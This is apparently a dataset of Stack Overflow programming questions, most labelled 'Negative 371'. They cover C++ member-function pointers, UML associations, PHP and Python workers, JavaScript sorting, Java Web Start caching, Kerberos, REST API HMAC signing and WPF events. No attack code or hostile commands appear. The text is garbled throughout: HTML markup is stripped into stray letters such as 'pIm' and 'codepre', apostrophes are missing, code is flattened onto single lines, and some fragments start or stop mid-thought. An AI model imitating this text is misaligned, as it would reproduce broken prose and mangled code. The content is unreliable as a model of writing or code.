Negative 371 pIm used to thinking of member functions as just being a special case of normal functions, where member functions have an extra parameter at the beginning of their parameter list for the this pointer, that is, the object on which the member function is supposed to act.

Which got me wondering if under the hood pointertomemberfunctions are really a separate beast, and that boost was taking care of details for me. p  pWhat does the standard dictate about the placement of the this parameter Perhaps just on my compiler the extra this argument comes first, and maybe on other compilers it could be on the end Am I just lucky that my way of thinking is consistent with how my compilers GCC4, VS2005 handle it Are pointertomemberfunctions always just a special case of pointertofunctions with an extra parameter or can the compiler implement them differentlyp

Negative 371 pIve recently spent a good deal of time performing detailed UML designs of various SW components that I have since written. Looking back on what I have recently finished and comparing that to when I first learned UML, I see that I now almost strictly use Aggregation and Composition relationships, and have virtually abandoned vanilla nondirecteddirected relationships. I still of course use Generalizations and Realizations, but these are distinctly different than those above and are not considered part of this question.p  pIt seems to me that AggregationComposition implies the same meaning of vanilla associations, and more. Aggregation and Composition naturally imply a direction, and any modern UML program will still allow you to define multiplicity on an AggregationComposition relationship and apply a verb to the relationship as well. At that point, I see little purpose to vanilla associations.p  pI understand some people have difficulty understanding the difference between Aggregation and Composition. Early on, I had a bit of difficult grasping how they differ, and I believe that confusion was part of the reason I used vanilla associations. Im at the point now where I see little or no use for vanilla associations, and actually dislike seeing them used as I believe they leave some things up for question particularly a strong or weak lifecycle relationship between two objects. I believe vanilla associations only practical use is when your understanding of the problem at hand isnt yet developed enough to determine the life cycle difference between aggregation and composition. In such a case it is better to atleast emshowem that the relationship exists and you can then come back and change it appropriately when you have a better understanding of the problem at hand.p  pLong story short, I believe the vast majority of the time that people use vanilla associations, they could be more accurately described as an aggregation, and sometimes as a composition. Am I terribly wrong in my belief Am I missing something Let me hear itp

Negative 371 pRight now Im running 50 PHP in CLI mode individual workers processes per machine that are waiting to receive their workload job. For example, the job of resizing an image. In workload they receive the image binary data and the desired size. The worker does its work and returns the resized image back. Then it waits for more jobs it loops in a smart way. Im presuming that I have the same executable, libraries and classes loaded and instantiated 50 times. Am I correct Because this does not sound very effective.p  pWhat Id like to have now is one process that handles all this work and being able to use all available CPU cores while having everything loaded only once to be more efficient. I presume a new thread would be started for each job and after it finishes, the thread would stop. More jobs would be accepted if there are less than 50 threads doing the work. If all 50 threads are busy, no additional jobs are accepted.p  pI am using a lot of libraries for Memcached, Redis, MogileFS, ... to have access to all the various components that the system uses and Python is pretty much the only language apart from PHP that has support for all of them.p  pCan Python do what I want and will it be faster and more efficient that the current PHP solutionp

This was always a risk for excessively complex layouts, but you can think of Android 1.5 as being better than 1.1 at exposing this problem. Most developers wont need to worry about this, but if your app has very complicated layouts, youll need to put it on a diet. You can simplify your layouts using the more advanced layout classes like FrameLayout and TableLayout.p  pI guess this can be my problem.p  pWhen it says broad , is it saying on the last level p  pThanksp  pDanielp

Negative 371 pI have several files with code testing code which uses a unittest class.p  pLater I found it would be nice to test database integrity also. I put this into a separate directory tree. Things like the keys have correct format, parent and child nodes are pointing correctly and such. Edit this is a nosql project, where I can not rely on database level checks liek referential integrity and such.p  pI use the same unittest class for the integrity tests.p  pNow I wonder if it makes really sense to keep this separate. To test the integrity of data I often duplicate parts of code that I use to test the code that handles the data.p  pBut it is not the same. The code tests use test databases that get deleted after each test and the integrity tests connect to the live data and analyze it. The integrity tests I want to call from cron and send an alarm if something happens in the live database.p  pHow would you handle that Are there standards for such a setup What is your experiencep  pMy tendency is to put everything in the same file, which would result in the code tests also being executed by the cron on the production environment.p  pemEditem What also drives me is to try to keep the project simple and not to have too many files touched by a single task or workflow. Without all the testing i already have a class file, a subclass, a related class, some library helper files and the main code. Testing adds one file.  It helps me keep my attention focussed while coding, it is less stressing and I believe I make less errors, and I can faster remember and find a certain code part with less files affected. Only one testing file per workflow would help here. If I keep it seperate there are 2 files data integrity testing and code testing and maybe 3 a common library for both. Abstraction would add complexity.p  pemEdit2em I am now refactoring a little bit and only moving the data testing files to the same directory tree where also the code testing lives, but keeping different files with the name indicating integrity or testing. I will not yet merge the files, because 2 people recommended against it, and I believe in their experience and advice for now. I will live with code duplication for the moment. p  pemEdit3em I forgot to mention that the selection of the tests per run is not determined by the tree structure in this case. The tests are enumerated in a master file, so I have 2 master files integrity and code testing at the present, and the test can live in the same directury structure. p  pMaybe more people will answer. Thank you so far for the valuable input, which is already helping me develop the final structurep  pemEdit4em I did more refactoring now. It seems I should keep 2 files, but with slightly modified purpose. One targeted for scheduled monitoring on the production server. And another one for development. But in both files can be integrity tests or code tests. And in both files operations can be performed on test databases that are erased after the test and on the permanent database each one has a permanent database, production server and develpment server. And one important thing I find myself moving lots of common code from the testing files to the class files. So the classes get also abilities that are for testing only. I like this so far, feels clean. I am not yet creating a library for testing that is shared between the 2 testing frontends, this code has gone to the class file of the obejct that is being teted for now.p  pPlease note that my comments below are signed with user89021 but its me, karlthorwald. I cant do anything about it.p

Ive seen a hrefhttpstackoverflow.comquestions694493limitingthenumberofobjectsinnsarraycontrollerhttpstackoverflow.comquestions694493limitingthenumberofobjectsinnsarraycontrollera , but that doesnt address my problem.p  pI want this property to be observable via bindings, so I set a dependency to arrangedObjects on it.p  pProblem is, when arrangedObjects is updated, limitedArrangedObjects seems not to be observing the value change in arrangedObjects.  Ive hooked up an NSCollectionView to limitedArrangedObjects, and zero objects are being displayed.

Negative 371 pIve recently discovered that MVC is supposed to have two different flavors, model one and model two. Im supposed to give a presentation on MVC1 and I was instructed that emits not the web based version, that is refered to as MVC2em.

Negative 371 pIm working with an array of objects in Javascript and need to sort them by date and time.

The array of events is manually ordered at first, and users can optionally add date and time values to places.

In Safari, it sorts mostly correct the first time, but puts one null date place at the top of the list.  In Firefox,  nothing happens at all.p  pIm a bit of a beginner, and I dont have a CS background at all, so Im not adept at the basics like arrays, dates, times etc...and my debugging skills are limited to the Firebug console.  No errors are being reported, so I really have no idea whats going wrong.p  pOne thing to note, if I eliminate the date type from the function so it sorts the items as strings, it works correctly...but that means 1102011 would sort before 192011, so I think I need the date type in there.p  pAny ideas whats going wrong  Is there a smarter way to do what Im trying to do p  pEDIT  Adding log valuesp  h2First sort Chromeh2  ul li08012010 li linull li linull li li08032010li linullli linullli linullli linullli li7012010li linullli linullli linullli ul  h2Second sort Chromeh2  ul li08012010 li linull li linullli linull li li07012010li linullli linullli linullli linullli linullli li8032010li linullli linullli ul

Negative 371 pIm not really sure how to phrase my issue, so I hope this isnt a repeat.p  pThe problem Im seeing is with Visual Studio 2008.   When I directly reference a project within my solution, I notice that the dependent reference occassionally gets out of synch, and my toplevel project ends up holding on to an old build of the DLL  most obvious in the fact that my breakpoints are no longer being hit.   I would expect behavior like this if my reference was DLLbased, but I thought reference the project directly was supposed to avoid these synchronization issues since the projects are built in tandem as part of the solution.p  pIf I manually change the version number of the dependent project, that seems to force a reference update and correct things, or of I rebuiild the dependent project, then clean, and rebuild the entry point project, the references seem to synch up, so I do have a workaround.  In the past, though, I never really noticed this problem a full rebuild of the solution usually kept everything synchronized in one easy step.p  pIt took me a little while and a good deal of frustration to determine the nature of the problem, and since its been sporadic, its taken me even longer to realize that its more than just a fluke.  all that to say, I cant quite pin point whats changed between the time things worked well, and now.p  pI have done the following fairly recently, so I was hoping to pick yalls brains to see if there were any known issues andor a simple fix related to any of these things.p  ul liUpgraded debatable adjective   my OS from XP to Windows 7li liUpgraded from 32bit to 64bit processor my OS change reflected this as well...32bit XP  64bit Win7 li liInstalled Visial Studio 2010 Express alongside my 2008 version.li ul  pIm running Visual Studio 2008 w SP1 v 9.0.30729.1p

Negative 371 pIm using RXTX to read data from a serial port.

Negative 371 pHello there fellow developers I am working on a Windows Phone 7 app and I cant figure out what I believe is a simple problem for the more seasoned ones. Say I have a layout consisting of two elements a ListBox filled with an abundance of items and a TextBlock providing the user with some basic instructions.p  pI want these to be one above the other when the device is in Portrait orientation and I want these to be next to each other when the device orientation changes to Landscape.p  pFor the Portrait orientation I am using a Grid layout manager, as it lets me define the rows heights like so... row 0 codeHeight2code, row 1 codeHeightcodep  pListbox sits in row 0, TextBlock in row 1. Now, what would be really neat is to simple change the codeRowDefinitioncodes into codeColumnDefinitioncodes and reassign the listboxtextblock to the grids columns instead of rows for when the device switches into Landscape.p  pBut thats just my idea. I dont know how to get this done elegantly. Maybe theres a better approach to this Or maybe this is the correct approach and there is some method built for exactly this purposep  pThank you for your suggestionsp

Negative 371 pThis bug tricked me into spending 4 hours debugging perfectly functional code last night.p  pBasically in certain situations c isnt updating a text labels text, instead it blanks it.p  pIll give you the setup. The code Im writing currently updates a text label with strings streamed over a network connection. Since its coming in from a networking connection, its also coming in from  a background thread so I have to use Control.Invoke.p  pIf  I send one or two strings it updates just fine.   I tell it to put the string data on a button controls text property it does it just fine.  No matter how fast it comes in.p  pHowever it doesnt display on labels if it comes in too fast. The label text is blanked instead, but occasionally Ill see brief flashes of data. Ive tried reading the label text property from other controls and its actually blanked of text, not just displaying nothing. Stopping the data stream leaves it blank.p  pHeres the actual code if that helps.p  precodeoncreate event public debugScreen   InitializeComponent   used incase guiUdater is ran from the wrong thread  guiupdate  new guiUpdateDelegateguiUpdaterFromBackgroundThread   delegate and creation defininiton for above private delegate Delegate guiUpdateDelegateInt32 location, string labelText guiUpdateDelegate guiUpdate    updates the form control public void guiUpdaterstring labelName, string labelText    gets theindex psoition of the control in the forms Control array, returns 1 if not found  Int32 location  findControlIndexNumberFromNamelabelName   if the item is found  if location gt 0     if this function was invoked from the wrong thread   if this.Controls[location].InvokeRequired      invoke the delagate with the function to handle gui updating from the corrext thread.    location is the index number of the array in the forms Control array    labelText is the new value for the label    this.Controls[location].Invokeguiupdate, location, labelText      else      if in correct thread just update the bloody thing    this.Controls[location].Text  labelText        else    if control was not found location  1 redo with error on label 9    guiUpdaterLabel9,not found   labelName     updates the text label private Delegate guiUpdaterFromBackgroundThreadInt32 location, string labelText   Controls[location].Text  labelText  return null  codepre  pIt doesnt do anything essential, just debug output, and since it updates just fine on buttons I know the data is getting through. So if this is the limit of this problem I can live with it. However Im pretty curious whats going. It looks like it might be cutting off in the middle of updating the label. Like its blanking the label, and then applying new text, but just stopping in the middle before the new text part.p  pIf this is the case it could be a warning of a nasty bug later if I dont nip it in the bud.p  pOn some advice tried adding Application.DoEvents, and Refresh to relevant parts of the code. Still had the same problem. After reading the documentation for the DoEvents method, I dont think its an issue of that. It should be firing on its own.p  pReading the documentation I tried substituting BeginInvoke, but same trouble. And BeginInvoke looks dangerous anyway.p

Negative 371 pHere is a warning I, and lots of people out there on the web, see when running gcc on C codep  precodecc1plus warning command line option Wstrictprototypes is valid for AdaCObjC but not for C codepre  pThe warning text is very clear C is not in the set [AdaCObjC ], so I have no question at all about why gcc gives this warning when compiling C code. FYI the reason we have this flag turned on in spite of having C code is because its mostly C code, we have chosen a strict high level of warning options list, but weve added a bit of C code.p  pMy question is Why isnt this warning valid for Cp  pThe gcc documentation for the warning option, from a hrefhttpgcc.gnu.orgonlinedocsgcc4.4.2gccWarningOptions.html relnofollowhttpgcc.gnu.orgonlinedocsgcc4.4.2gccWarningOptions.htmla, isp  blockquote   pWstrictprototypes C and ObjectiveC only Warn if a function is declared or defined without specifying the argument types. An   oldstyle function definition is permitted without a warning if   preceded by a declaration which specifies the argument types.p blockquote  pNow I just emknowem Im forgetting something obvious about C, but doesnt C also require specifying argument types for functions in a prototype True that those function prototypes are often in class declarations because the functions are often member functions, but arent prototypes nevertheless required Or even if theyre just good practice, then why wouldnt gcc offer support by this option Or if not, by a parallel option for Cp

Negative 371 pAt my company we are using Java Web Start to distribute client software to the customers. They are using different Windows versions XP, Vista and 7.p  pWeve deployed a version through JWS with minimal problems in the past. Our latest release includes several file changes, some jars are gone, others appeared, etc.p  pWe found out that upgrade on Windows XP machines fails because JWS still tries to look up jar files which arent available anymore on the web server. Ive checked my HTTP servers log and the JNLP file never gets accessed from XP machines during application startup. If i try the same on Vista or Windows 7 everything works fine, JWS fetches the JNLP descriptor and downloads the differences when an update is available. So on XP machines only the known jar files gets updated and JWS throws an error if it doesnt find something from the cached JNLPs fileset.p  pIve written a servlet which manually generates the JNLP file. Im using the following header config in my servlet code.p  precoderesponse.setDateHeaderLastModified, lastModification  IE wont download JNLP file if CacheControl header presents response.setHeaderCacheControl, nocache, mustrevalidate response.setHeaderExpires, Mon, 26 Jul 1990 050000 GMT codepre  pThis makes the JNLP file always outdated which should trigger recheck of the file every time the client gets started through JWS.

But only on XP because of the white space characters in the deployment caches path Documents and Settings you know. Somebody says there that if i change the deployment caches path to something which dont have space characters in, it will solve the problem. Well its not an actual solution because users can hardly ever write to locations other than their profile.p  pBecause this bug exists for such a long time i guess there should be some kind of workaround. I dont like to tell the customer every time to clear the Java cache and reinstall the application from web. We like to move to a more faster release cycle in the future which will make this even worser. I hope someone has a good idea for this. p

Using kerbtray again to examine the tickets this time there are 2 tickets on the client for the domain krbtgt.COM. Both of tickets have key encryption type RSADS1 RC4HMAC, one also has this for ticket encryption type, but the other has Kerberos AES256CTSHMACSHA196.p  pI dont know for sure that this is the cause of the problem, but it is the only difference Ive been able to find in the two environments that might explain the authentication exception. Ive tried changing the AD encryption policy, tried IE and Firefox, and pretty much everything else I could think of, but nothing has worked.p  pAny help addressing this would be much appreciated. Id prefer to fix it on the java end as I probably cant dictate too much about the production AD setup.p

Negative 371 pI have a problem with sending data through sockets from a java servlet running on tomcat. My java servlet needs to send through sockets strings to the client side which is a java application. The problem is that the connection is established checked with netstat but the client side socket doesnt receive anything. I also tried to use netcat but this doesnt receive anything, also. I tried to create a new thread with the server socket in java servlet but in this case the port isnt even listening.p  pCan you please tell me if there is something wrong with java servlets and sockets or sockets with tomcat And if there is any other solutionp  hr  pstrongUpdatestrong Thank you for the clues but i need sockets or a permanent communication.p  pI have a web application which sends http requests to the servlet. This part of  communication works. I need the sockets in the servlet because i need to maintain a continuous communication with my java application not a servelt. I tried to use URLConnection but if the servlet wants to send another set of parameters the java application blocks. Do you have any idea of how i can have a permanent communication between servlet and java application which behave like a serverp  pMy Java application must send to the server my http server that i would like to be implemented within servlet ,and further to the servlet, some buffers of strings containing results. Than, that servlet will send to the web application the information from servlet. I found out that it might be the concept of sandboxing from tomcat that might restrict sending information through sockets. I also tried with Mina but it also didnt work. If i tried to connect to the socket with telnet i was receiving Connection closedp

Found it fantastically well crafted, but Im not a fan of all of those classes polluting my html. p  pSo Im trying to use Less to make it more semantic. I was doing quite good til I step over on the strong.containerstrong class. There is a mixin in the strongmixins.lessstrong file line 580 that sets the container width. But I cant make it work without including the class directly on the html. I always get compile errors when putting it in my custom file. I tried copying and inserting that in my file, but without success... anyone have gone through this p  pOff course, I could force the width manually, but I dont think it would be the best approach. Any ideasp

Negative 371 pIm thinking about using HBase as a source for one of my MapReduce jobs.  I know that TableInputFormat specifies one input split and thus one mapper per Region.  However, this seems inefficient.  Id really like to have multiple mappers working on a given Region at once.  Can I achieve this by extending TableInputFormatBase  Can you please point me to an example  Furthermore, is this even a good ideap  pThanks for the help.p

Negative 371 pCan I move response object somehow from one process to anotherp  pThe first process is a nonblocking server which does some other IO. It needs to be done in a nonblocking environment like Tornado or Twisted or something like this.p  pAnother process actually, a pool of worker processes is needed to process images with PIL. I cant do it in threads because of GIL. However, either the worker needs to get a filehandle of response object to write the result to, or it should return the result back to the first process, and since the result can be pretty huge 1 mb, it does not seem like a good idea. Its probably going to be a separate pool of processes, not a fork for every request  the latter one seems like a bad strategyp  pSo, can I somehow allow the worker process to write to the response directlyp

Negative 371 pI have a REST web service that converts a HTML table string to CSV format, and returns the file name of the CSV file GUID.p  pThis operates fine, however when the data posted exceeds 40 KB, the call fails with error 400.p  pMr Google has instructed me to set the following variables to their maximum limit within the web.config  maxRequestLength  maxUrl request limit  maxQueryString request limit  maxReceivedMessageSize  maxArrayLength  maxBytesPerRead  maxDepth  maxNameTableCharCount  maxStringContentLength  maxItemsInObjectGraphp  pI understand that some of these will need to change to ensure proper security however at this point I am solely concerned with getting the WS to accept data over 40 kb.p  pI have viewed countless posts, and all point to the solution of setting maxReceivedMessageSize.

Negative 371 pFor a single page app, how I figure you go about templating server side is you basically load all the pages as hidden on initial load except the index, and switch between pages by hidingunhiding, or translating, or whatever approach you take. Whereas if you template clientside, then you have all the pages loaded as script files and you render them into html when theyre needed. Based on these techniques, my impression is that the clientside templating would be faster for the initial load since it just downloads the scripts instead of parsing them, then offsets the parsing for later. Is this right Are there other, better ways of doing it so that your initial load time is shorterp

Negative 371 pI have a few applications which use the fantastic nodesqlite3 module. Its one drawback is that it builds sqlite from source when its installed. This is compounded by the way I do deployment Im using chef, which gives me a clean source tree for every deploy. I then do an codenpm installcode at each application root. This isnt a problem for most things since it just hits the local cache. But for sqlite3, it builds a whole new copy for each place the module is referenced 4 times in my case What would take seconds now takes minutes, which especially sucks when testing out new changes in a staging environment. p  pIn principle, I should be able to do a build once for a given version of the module, cache it, and just copy or link in the binary on deployment. Has anybody done something similar Are there demons lurking herep

Negative 371 pwe have a caching issue when editing cshtml files. Our ASP.net MVC 3 application is hosted with IIS 7.5 on Windows Server 2008. Now, when we edit a cshtml file the changes wont show until we reset iis  which is something we do not want to do too frequently on our production system. p  pAccording to fiddler, STRGF5 and Firebug its not a clientside caching issue which would have been weird anyway. So no caching related HTTP headers are sent to the client. We do have staticContent configured in our web.config though.p  pTheres no OutputCaching configured in anyway for the corresponding controller actions, either. Actually, we do not use OutputCaching at all in this project. We couldnt find much on the internet and are kinda puzzled at what is actually happening here.p  pAny idea why IIS, ASP.Net MVC or something in between the client and the web server is seemingly caching the content of cshtml files p  pRelated views are no child views.p  pNote this is not an issue with cassini. Also, Partial Views with dyamic content within an updated View behaves correctly. Which also leads to the conclusion for me that its not related to OutputCaching whatsoever.p  pThanks in advance.p

For instance, I have an address field that updates depending on the input. Right next to it, though is another label that simply reads Address. p  pHeres the weird part Halfway through adding labels, the labels that I added outlets to all started jumping halfway up the screen when I would build and run the program. In addition, those that didnt jump which included the first 3 outleted labels up the screen were pushed down as if to make room for the misplaced labels. If I add new labels, they stay put, but if I outlet them, they jump up with the rest...p  pAnybody have any ideasp

The site returns a 406 error Accept header request not accepted. If I try once more, the page loads. Then, the real kicker is that after the page loads successfully, the XMLHttpRequest no longer succeeds. So apparently, my header alteration is globally affecting Chrome and isnt limited to my extensions sandbox.

The plain environment surrounds each code block by vertical space,  and it uses abovedisplayskip and belowdisplayskip to get spacing  similar to formulas. Note that if these dimensions are changed,  the spacing around displayed math formulas changes as well.  All code is indented using leftskip.   Changed 19.08.2004 to reflect changes in colorcode.

Negative 371 pI have an input file which is in a Fortran namelist format which I would like to parse with python regular expressions.  Easiest way to demonstrate is with a ficticious examplep  precodeVEHICLES  CARS 1,  TRUCKS  0,  PLAINS 0, TRAINS  0,  LIBAUTO.DAT, C This is a comment C Data variable spans multiple lines  DATA1.2,2.34,3.12,       4.56E2,6.78, END PLOTTING  PLOTT,  PLOT212, END codepre  pSo the keys can contain regular variablename characters as well as parenthesis and numbers.  The values can be strings, boolean T, F, .T., .F., TRUE, FALSE, .TRUE., .FALSE. are all possible, integers, floatingpoint numbers, or commaseparated lists of numbers. Keys are connected to their values with equal signs.  KeyValue pairs are separated by commas, but can share a line.  Values can span multiple lines for long lists of numbers.  Comments are any line beginning with a C.  There is generally inconsistent spacing before and after  and ,.p  pI have come up with a working regular expression for parsing the keys and values and getting them into an Ordered Dictionary need to preserve order of inputs.p  pHeres my code so far.  Ive included everything from reading the file to saving to a dictionary for thoroughness.p  precodeimport re from collections import OrderedDict  fopenfile.dat,r filestrf.read  Compile regex pattern for requested namelist nameVehicles  pnamelist  re.compilername.upper.END,flagsre.DOTALLre.MULTILINE  Execute regex on file string and get a list of captured tokens mnamelist  pnamelist.findallfilestr  Check for a valid result if mnamelist     The text of the desired namelist is the first captured token     namelistmnamelist[0]  Split into lines linesnamelist.splitlines  List comprehension which returns the list of lines that do not start with C Effectively remove comment lines lines  [item for item in lines if not item.startswithC]  Recombine now that comment lines are removed namelistn.joinlines  Create keyvalue parsing regex pitem  re.compiler[s,]ss[][s,][s,]s,flagsre.DOTALLre.MULTILINE  Execute regex items  pitem.findallnamelist  Initialize namelist ordered dictionary n  OrderedDict  Remove undesired characters from value     for item in items     n[item[0]]  item[1].strip,rn  codepre  pMy question is whether Im going about this correctly.  I realize there is a ConfigParser library, which I have not yet attempted.  My focus here is the regular expressionp  precode[s,]ss[][s,][s,]s codepre  pbut I went ahead and included the other code for thoroughness and to demonstrate what Im doing with it.  For my Regular Expression, because the values can contain commas, and the keyvalue pairs are also separated by commas, there is no simple way to isolate the pairs.  I chose to use a forward lookahead to find the next key and .  This allows everything between the  and the next key to be the value.  Finally, because this doesnt work for the last pair, I threw in  into the forward lookahead meaning that if another VALUE isnt found, look for the end of the string.  I figured matching the value with [] followed by a lookahead was better than trying to match all possible value types. p  pWhile writing this question I came up with an alternative Regular Expresson that takes advantage of the fact that numbers are the only value that can be in listsp  precode [s,]sssd[d.E]s,2,[,] codepre  pThis one matches either a list of 2 or more numbers with codesd[d.E]s,2,code or anything before the next comma with code[,]code.p  pAre these somewhat messy Regular Expressions the best way to parse a file like thisp

Negative 371 pIve created a simple RESTful API for a project partially following a hrefhttpwww.thebuzzmedia.comdesigningasecurerestapiwithoutoauthauthentication relnofollowthis very good blog post by Riyad Kallaa. Now, Ive read dozens of similar questions on Stack Overflow but I cant seem to find an answer to my security question.p  pBriefly, my requests go like thisp  ol liThe client has a public API key plaintext, accessible to anybody sniffing the network traffic or properly checking the code sourceli liThe client sends a request to the server with the public API keyli liThe server has a secret API key secret to anybody but the developerli liThe server creates a HMACSHA1 hash composed of the clients request data and the secret API Keyli liThe server sends a request identical to the clients request to the API server, but including the resulting HMACSHA1li liThe API server looks up the secret API key in its database based on the public API key it receivesli liThe API server recreates a HMACSHA1 hash using the same data as the developers serverli liIf the hashes match, the request is considered valid and is processed normallyli ol  pIm concerned that somebody using my service could fetch the public API key by sniffing network traffic lets say, and then simply cURL the same request the client would originally do via their browser using AJAX directly to the developers server. Therefore, the malicious user could be authenticated as a legit user and access the API with somebody else secret API key.p  pIll try to give a concrete example. Normally I would dop  ol liAJAX a get request to my server.li liMy server hashes my request with my API secret and send it to the API server.li liThe API server validates my request and returns the payload.li ol  pBut Im scared thatp  ol liDr. Evil will sniff my public API key.li liDr. Evil will cURL a get request to my server using my public API key.li liMy server will hash Dr. Evils request with my API secret and send it to the API server.li liThe API server validates and returns the payload to complete Dr. Evils vicious plans.li liDr. Evil laughs an evil laugh.li ol  pAnything Im missing or is this just part of the RESTful API gamep  pUPDATE I am voluntarily omitting any form of timestamp validation to keep things simple and just focus on the authentication issue.p  pUPDATE 2 Ive added a codeSERVER[HTTPREFERER]code validation to the process. The goal here is that the client must send a referrer along with the request and it must match the referrer listed in the database on the APIs side. Unfortunately, HTTP referrers can be faked easily. It is yet another level of security, but still not perfect.p  pUPDATE 3 Ive changed my server side code to set the referrer to the remote IP address. This forces every request sent to my server that wants to be hashed using the secret API key ultimately get to the API server with the original request IP address. This IP can then be validated and the request can go through. I believe it is yet possible to fake codeSERVER[REMOTEADDR]code, but it is more complex than faking codeSERVER[HTTPREFERER]code... Still not perfect I guess.p  pstrongUPDATE 4strong According to these posts a hrefhttpstackoverflow.comquestions5092563howtofakeserverremoteaddrvariableHow to fake SERVER[39REMOTEADDR39] variablea and a hrefhttpserverfault.comquestions90725areipaddressestrivialtoforgehttpserverfault.comquestions90725areipaddressestrivialtoforgea, faking the codeSERVER[REMOTEADDR]code is possible though difficult. It is, however, impossible to receive a response from the faked request since youre not in control of the faked network. The request can be validated successfully but will its response wont fall unto malicious hands.p

Negative 371 pI primarily program in the WinForms environment and, among other things, strongverystrong often use the codeTreeViewcode control.p  pThat being the case, I have a Utility class I developed which has a lot of my most common functions  Things such as converting a DataTable to a delimitted string that can be outputted to a text file, popping up a SaveAs dialog and returning the filename the user chooses or returning a list of checked treenodes from a specified treeview, etc.p  pGiven that I have this utility class, I am now trying to add it to an ASP.Net application and it is giving me a lot of obvious errors with, for example, codeTreeNodecode having different properties between WinForms and ASP.p  pNow, I know the first and most intelligent response to me would be to separate out all these different functions into separate utility files and libraries and add them asisneeded  applicable to each application  I understand the benefits and logic of that, but my question is more about the theory of creating the class itself.p  pIs there a way to create a class that will include, for exmaple, WinForms objects and I could still add it to an ASP application without it erroring In other words, I wont use those functions since they obviously wont work for this architecture, but is there a way to stop the errors from appearing just because the objects appear wrong to this architecture and just have the compiler accept that file  Then Ill just use the functions I know ARE appropriate for this architecturep  pAs a stupid example of a function in my Utility class thats fine in winForms, but Errors in ASPp  precodePublic Shared Function CreateTemporaryNodeByVal NodeName As String As TreeNode     Dim TempNode As New TreeNode      TempNode.Name  NodeName     TempNode.Text  NodeName      Return TempNode End Function codepre  pIn this case codeName is not a member of System.Web.UI.WebControls.TreeNodecodep  pstrongEDITstrong Just to clarify  I understand the bad programming practice on this specific situation. My question is moreso about trying to learn if there was a way to hide functions missing libraries from the compiler so a class could be used within multiple architectures without the need for adding in libraries for functions you wont be using  needing.p  pI hope this question makes sense and thanks for your expertise.p

Negative 371 pI have a MySQL database table that I need to process. It takes about 1 second to process 3 rows due to CURL connections I need to make for each row. So, I need to fork the PHP script in order to have a reasonable time since I will process up to 10,000 rows for one batch.p  pIm going to run 1030 processes at once, and obviously I need some way to make sure that processes are not overlapping in terms of which rows they are retrieving and modifying.p  pFrom what Ive read, there are three ways to accomplish this. Im trying to decide which method is best for this situation.p  pstrongOption 1strong Begin a transaction and use codeSELECT ... FOR UPDATEcode and limit the  of rows for each process. Save the data to an array. Update the selected rows with a status flag of processing. Commit the transaction and then update the selected rows to a status of finished.p  pstrongOption 2strong Update a certain number of rows with a status flag of processing and the process ID. Select all rows for that process ID and flag. Work with the data like normal. Update those rows and set the flag to finished.p  pstrongOption 3strong Set a codeLIMIT ... OFFSET ...code clause for each processs codeSELECTcode query, so that each process gets unique rows to work with. Then store the row IDs and perform and codeUPDATEcode when done.p  pIm not sure which option is the safest. I think option 3 seems simple enough, but I wonder is there any way this could fail Option 2 also seems very simple, but Im not sure if the locking due to the codeUPDATEcode cause everything to slow down. Option 1 seems like the best bet, but Im not very familiar with codeFOR UPDATEcode and transactions, and could use some help.p  pstrongUPDATEstrong For clarity, I have currently just one file process.php which selects all the rows and posts the data to a thirdparty via Curl onebyone. Id like to have a fork in this file, so the 10,000 rows can be split among 1030 child processes.p

Negative 371 pIm trying to work with raw audio data for manipulation and playback with OpenAL. So far everything works nice and dandy since Ive written my own .wav file reader and have been working with that. However, my goal is for people to import their own music. This implies that my program should support various audio formats and codecs, including atleast MP3, Ogg and FLAC.p  pNow unlike reading a .wav file, the other formats arent as straightforward. Now I could possibly write my own readers and  or use wrappers of various existing libraries such as libsnd and the ogg library, but Id rather not reinvent the wheel. So my question is is there a library already that allows fetching the raw byte audio data from various formats in Monop  pIve taken a look at NAudio, but its highly dependant on various Win32 API calls, which is a nogo for me as I intend to make my program multiplatform. At the moment I only care about getting the data for reading and playback purposes, I do not intend to manipulate, mix, or any other kind of computational work.p  pstrongEDITstrong One important factor I forgot was licensing. Id prefer an MIT based licensing or other open license that allow me to use the library for free in commercial software. The BASS.Net library for example is out of the question, as licensing the library is out of my budget.p  pstrongEDIT2strong irrKlang does not support Mono.p

Negative 371 pA conventions conundrump  pFor simplicitys sake, lets say I have a View called FruitView with a label that says Choose a fruit and choices such as apple, orange, pear, etc. in a ListBox.p  pEach item is an instance of a class Apple.cs, Orange.cs, Pear.cs, etc..p  pThe ViewModel keeps track of the selected fruit with a binded propertyp  precodepublic Fruit CurrentFruit  get set  codepre  pFruit itself is an interface that each of Apple, Orange, Pear, etc. derive from.p  pNow, another step, each of Apple, Orange, Pear, etc. Apple.cs depend on static classes called AppleManager, OrangeManager, PearManager, etc. which have methods and events. These managers are significantly different, and do not derive from any common base or interface.p  pFor example, AppleManager might havep  precodepublic delegate void ColorChangedEventHandlerstring color  public static event ColorChangedEventHandler ColorChanged  private void RaiseColorChangedstring color      if ColorChanged  null              ColorChangedcolor       codepre  pWhen apple is selected in the view, the rest of the Views buttons, images, etc. need to react to events that originate in AppleManager when orange is selected, the view needs to react to events in OrangeManager.p  pSo, the question is, whats the proper pathway for hooking up the Views reaction methods to the manager of CurrentFruit in the ViewModelp  pI mean, its possible to gop  precodeprivate void FruitListBoxSelectionChangedobject sender, SelectionChangedEventArgs e       pseudocode if apple selected, AppleManager.ColorChanged  new ColorChangedEventHandlerCurrentFruitColorChanged   private void CurrentFruitColorChangedstring color      FruitColorTextBox.Text  color  codepre  pThe reason this is unacceptable is because it breaks the design pattern, and means I need to handle for every kind of fruit.p  pin reality, instead of fruit options, I have many medical devices, and I want to use the interface as, well, emas an interfaceem, rather than adding extra logic.p  pMy current solution was to add events to the interface VCONF, like sop  precodepublic interface VCONF      public static event CallIncomingEventHandler CallIncoming     public static event EventArgs CallStarted     public static event EventArgs CallEnded  codepre  pNow VCONF1, VCONF2, VCONF3, etc. all derive from VCONF, and they implements these events with has methods to raise them.p  pemThis means that I have to write those same event lines in each VCONF1, etc., but that is the same as having multiple classes inherit INotifyPropertyChangedthats why I set it up this way. It also means having those same events and raise methods written in VCONF1Managera chain of raise event, above layer raises event, above layer raises event, and so on, until the View can react to it. VCONF1Manager.CallIncoming  VCONF1.CallIncoming  View reactsemp  pVCONF1 subscribes to the events in VCONF1Manager, VCONF2 subscribes to the events in VCONF2Manager, etc.p  pOther VCONF might not even have a manager, just having their own way to determine when its time to raise these events.p  pThe View subscribes to the events of the current VCONF when it is selectedp  precodeprivate void VCONFSelectionChangedobject sender, SelectionChangedEventArgs e      this.DataContext as VCONFViewModel.CurrentVCONF  sender as ListBox.SelectedValue as VCONF      sender as ListBox.SelectedValue as VCONF.Device as VCONF.CallIncoming  new 